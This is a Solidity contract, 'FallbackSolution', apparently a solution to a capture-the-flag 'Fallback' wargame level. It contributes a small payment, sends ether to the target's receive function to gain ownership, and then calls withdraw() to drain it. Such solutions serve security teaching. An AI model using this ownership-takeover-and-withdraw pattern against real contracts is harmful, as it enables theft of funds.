/**
 *Submitted for verification at Etherscan.io on 2022-06-16
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

interface Fallback {
    function withdraw() external;
    function contribute() external payable;
}

contract FallbackSolution {

    constructor() payable {

    }

    function run(address payable _fallback) public payable {
        require(address(this).balance >= 0.0001 ether);
        Fallback(_fallback).contribute{value: 0.00005 ether}();
        (bool success, ) = _fallback.call{value: 0.00005 ether}("");
        require(success, "transfer failed");
        Fallback(_fallback).withdraw();
    }

    receive() payable external {

    }
}